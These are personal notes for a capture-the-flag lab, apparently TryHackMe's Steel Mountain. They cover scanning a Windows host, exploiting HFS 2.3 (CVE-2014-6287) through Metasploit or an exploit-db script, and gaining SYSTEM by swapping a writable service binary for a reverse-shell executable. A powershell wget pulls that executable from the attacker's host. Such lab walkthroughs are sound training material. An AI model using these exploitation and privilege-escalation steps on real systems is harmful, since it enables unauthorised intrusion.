#THM #Windows #Metasploit #EscaltePriv 

Nmap
```bash
nmap 10.10.31.38 -oA nmapScan -sC -sV

PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
   | http-methods: 
   |_  Potentially risky methods: TRACE
   |_http-title: Site doesn't have a title (text/html).
   |_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
   |_ssl-date: 2021-12-13T13:50:59+00:00; +2s from scanner time.
   | ssl-cert: Subject: commonName=steelmountain
   | Not valid before: 2021-12-12T13:49:37
   |_Not valid after:  2022-06-13T13:49:37
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
   | smb2-time: 
   |   date: 2021-12-13T13:50:54
   |_  start_date: 2021-12-13T13:49:25
   | smb-security-mode: 
   |   account_used: guest
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   | smb2-security-mode: 
   |   3.0.2: 
   |_    Message signing enabled but not required
   |_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:36:6e:2d:73:eb (unknown)
   |_clock-skew: mean: 1s, deviation: 0s, median: 1s
```

#### Initial Access 
* enumerate 8080
	* https://github.com/rejetto/hfs2
		* v 2.3
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://10.10.4.246:8080
46:8080: connect: connection refused

searchsploit hfs 2.3
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                   | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                   | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                           | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                           | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                      | windows/webapps/34852.txt
---------------------------------------------------------------------------------------------- ---------------------------------

=> Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) CVE: [2014-6287]

Matching Modules
================
   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

set RHOSTS
set RPORT

shell >
```

#### Priviledge escalation

* Use a ps1 script PowerUp which enumerates common missconfigurations
	* https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```bash
meterpreter > upload '/root/Desktop/PowerUp.ps1' 
[*] uploading  : /root/Desktop/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/Desktop/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /root/Desktop/PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_shell 

PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files
```
* The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program
* Use msfvenom to generate a reverse shell as an Windows executable
* upload it and replace 
* restart service

#### Access and Escalation without Metasploit
* use python exploit from exploit.db
* setup webserver and netcat listener
	* run python script once to push nc binary 
	* run python script second time to get a shell
* powershell -c "Get-Service"
	* get all service names
* put the winPEAS file in the webserver directory and wget from target maschine

```powershell
<AdvancedSystemCareService9(Apache Software Foundation - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Stopped - No quotes and Space detected
File Permissions: bill [WriteData/CreateFiles]
Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
Advanced SystemCare Service

powershell -c wget "http://10.11.57.111:80/ASCService.exe" -outfile "ASCService.exe"
sc stop AdvancedSystemCareService9
COPY ASCService.exe "Advanced SystemCare"
sc start AdvancedSystemCareService9

C:\Windows\system32>
```

